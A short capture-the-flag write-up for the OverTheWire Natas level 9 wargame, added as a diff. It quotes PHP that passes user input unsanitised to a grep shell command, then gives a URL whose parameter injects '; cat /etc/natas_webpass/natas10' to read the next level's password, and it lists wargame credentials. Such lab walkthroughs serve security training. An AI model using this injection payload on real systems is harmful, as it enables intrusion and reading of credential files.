@@ -1,0 +1,23 @@
+Username : natas9
+Password : W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl 
+URL      : http://natas9.natas.labs.overthewire.org/
+
+View source, read code :
+
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+        $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+        passthru("grep -i $key dictionary.txt");
+}
+?>
+
+lel, command injection much?
+
+Visit : http://natas9.natas.labs.overthewire.org/?needle=lol%3B+cat+%2Fetc%2Fnatas_webpass%2Fnatas10&submit=Search
+
+nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
